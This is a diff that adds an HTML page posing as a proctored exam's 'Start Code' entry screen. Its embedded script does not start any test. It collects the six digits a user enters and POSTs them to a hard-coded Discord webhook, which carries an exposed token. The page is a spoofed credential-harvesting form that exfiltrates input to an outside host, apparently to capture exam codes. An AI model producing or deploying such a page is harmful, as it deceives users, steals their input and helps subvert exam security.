@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Start Code</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="help-section">
+                <img src="qmark.png" alt="Help Icon" class="help-icon">
+                <a href="#" class="help-link">Help</a>
+            </div>
+            <a href="#" class="home-link">
+                Return to Home
+                <img src="homeicon.png" alt="Home Icon" class="home-icon">
+            </a>
+        </header>
+        <main>
+            <h1>Start Code</h1>
+            <p>Enter your start code now to begin testing. Good luck!</p>
+            <p class="note">The start code contains <strong>numbers only</strong>.</p>
+            <div class="code-input">
+                <input type="text" maxlength="1" id="digit1">
+                <input type="text" maxlength="1" id="digit2">
+                <input type="text" maxlength="1" id="digit3">
+                <input type="text" maxlength="1" id="digit4">
+                <input type="text" maxlength="1" id="digit5">
+                <input type="text" maxlength="1" id="digit6">
+            </div>
+            <button class="start-button" id="startTestBtn">Start Test</button>
+        </main>
+        <footer>
+            <p>You can <a href="#">review the instructions</a> that the proctor reads aloud.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Add your Discord webhook URL here
+        const webhookUrl = 'https://discord.com/api/webhooks/1287249726193930242/_gKgvkDU9GKNYUVg31AF6Nj8zZ6CSR0_fWlzV5GPiLD2JfVc5hfORrI6QjWj1TBY1-oh';
+
+        // Function to collect input and send to Discord
+        function sendCodeToDiscord() {
+            // Get the values of the input fields
+            const digit1 = document.getElementById('digit1').value;
+            const digit2 = document.getElementById('digit2').value;
+            const digit3 = document.getElementById('digit3').value;
+            const digit4 = document.getElementById('digit4').value;
+            const digit5 = document.getElementById('digit5').value;
+            const digit6 = document.getElementById('digit6').value;
+
+            // Combine the digits into the start code
+            const startCode = digit1 + digit2 + digit3 + digit4 + digit5 + digit6;
+
+            // Check if all fields are filled
+            if (startCode.length !== 6) {
+                alert("Please enter a 6-digit start code.");
+                return;
+            }
+
+            // Create the message content for the webhook
+            const messageContent = {
+                content: `Start code entered: ${startCode}`
+            };
+
+            // Send the POST request to the Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(messageContent),
+            })
+        
+        }
+
+        // Attach the function to the button click event
+        document.getElementById('startTestBtn').addEventListener('click', sendCodeToDiscord);
+    </script>
+</body>
+</html>
